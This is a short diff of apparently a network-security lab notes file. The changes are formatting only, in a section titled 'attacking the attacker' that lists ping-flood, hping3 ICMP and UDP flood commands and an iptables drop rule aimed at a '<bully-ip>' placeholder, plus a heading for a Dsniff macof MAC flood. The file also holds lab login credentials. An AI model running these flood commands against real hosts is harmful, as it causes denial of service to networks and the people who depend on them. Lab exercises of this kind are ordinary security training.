@@ -362,7 +362,10 @@ Username: agent
 Password: agent    
 What IP address is pinging Target6?
 
-**Attacking the attacker**    
+---  
+
+# attacking the attacker    
+    
 ICMP (ping flood)	Overloads bully’s ICMP traffic    
 #### `ping -f -s 65507 <bully-ip>`	    
 #### `hping3 --flood --icmp <bully-ip>`	    
@@ -373,11 +376,9 @@ TCP RST attack: Closes TCP connections on specific ports
 
 UDP attack: Overload and Block    
 #### `hping3 --flood --udp -p <port#> <bully-ip>`	    
-#### `iptables -A INPUT -p udp --sport <port#> -s <bully-ip> -j DROP`	    
-    
+#### `iptables -A INPUT -p udp --sport <port#> -s <bully-ip> -j DROP`	  
     
 
- 
 ---
 
 # Use the Dsniff tool Macof to conduct a MAC Flood attack     
